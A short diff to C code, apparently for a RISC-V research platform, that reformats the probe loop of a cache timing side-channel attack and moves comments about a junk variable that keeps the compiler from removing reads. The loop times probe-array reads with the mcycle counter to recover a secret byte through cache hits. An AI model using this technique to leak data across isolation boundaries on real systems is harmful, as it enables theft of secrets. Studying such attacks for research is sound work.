@@ -109,22 +109,24 @@ volatile char* outputAddr = (char*)0x40002000;
 
 void cacheAttack(uint8_t* outIdx, uint32_t* outTimes){
 
-			register uint32_t start, diff; // Use register variables (can only be local) to reduce access time.
-			// Read out probeArray and see the hit secret value.
-			/* Time reads. Order is slightly mixed up to prevent stride prediction (prefetching). */
-			for (int i = 0; i < ARRAY_SIZE_FACTOR; i++) {
-				mixed_i = ((i * MIXER_A) + MIXER_B) & (ARRAY_SIZE_FACTOR-1);
-				start = READ_CSR(mcycle);
-				//There should be nothing between these 2 rows, otherwise you need to adjust the threshold. 
-				dummy &= probeArray[mixed_i * ARRAY_STRIDE];
-				diff = (READ_CSR(mcycle) - start);
+	register uint32_t start, diff; // Use register variables (can only be local) to reduce access time.
+	// Read out probeArray and see the hit secret value.
+	/* Time reads. Order is slightly mixed up to prevent stride prediction (prefetching). */
+	for (int i = 0; i < ARRAY_SIZE_FACTOR; i++) {
+		mixed_i = ((i * MIXER_A) + MIXER_B) & (ARRAY_SIZE_FACTOR-1);
+		start = READ_CSR(mcycle);
+		//There should be nothing between these 2 rows, otherwise you need to adjust the threshold. 
+		dummy &= probeArray[mixed_i * ARRAY_STRIDE];
+		diff = (READ_CSR(mcycle) - start);
 
-				// Condition: interval of time is smaller than the threshold.
-				if ((uint32_t)diff < CACHE_HIT_THRESHOLD){
-					results[mixed_i]++; /* Cache hit */
-				}
-			}
-
+		// Condition: interval of time is smaller than the threshold.
+		if ((uint32_t)diff < CACHE_HIT_THRESHOLD){
+			results[mixed_i]++; /* Cache hit */
+		}
+	}
+	/* Use junk so above 'dummy=' row won't get optimized out. Order of the following instructions seems to be in a fixed position. */
+	/* results[0] of static array results() will always be translated into a NULL control character in ASCII or Unicode, so don't worry. */
+	/* ^ bitwise exclusive OR sets a one in each bit position where its operands have different bits, and zero where they are the same.*/
 	results[0] ^= dummy;
 
 	outIdx[0] = 0;
@@ -220,9 +222,7 @@ void main(){
 			cacheAttack(hitIdx, hitTimes);
 		}
 
-		/* Use junk so above 'dummy=' row won't get optimized out. Order of the following insturctions seems to be in a fixed position. */
-		/* results[0] of static array results() will always be translated into a NULL control character in ASCII or Unicode, so don't worry. */
-		/* ^ bitwise exclusive OR sets a one in each bit position where its operands have different bits, and zero where they are the same.*/
+		
 	//	results[0] ^= dummy;
 	//	topTwoIdx(results, RESULT_ARRAY_SIZE, output, hitArray);
 	//	resultOutput(results, RESULT_ARRAY_SIZE, output, hitArray);
